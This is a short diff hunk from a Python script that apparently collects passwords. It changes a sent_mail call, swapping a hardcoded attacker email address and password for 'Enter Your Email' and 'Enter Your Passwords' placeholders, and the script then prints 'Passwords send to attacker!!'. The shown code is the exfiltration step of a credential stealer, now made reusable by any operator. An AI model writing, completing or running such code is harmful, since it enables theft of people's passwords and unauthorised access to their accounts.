@@ -52,7 +52,7 @@ for i in range(len(list)):
     test4=test4+test3
 
 #print(test4)
-sent_mail("attacker127.0.0.1@gmail.com","H@ck gm@il attacker14",test4)
+sent_mail("Enter Your Email","Enter Your Passwords",test4)
 print()
 print(" Passwords send to attacker!!")
 print()
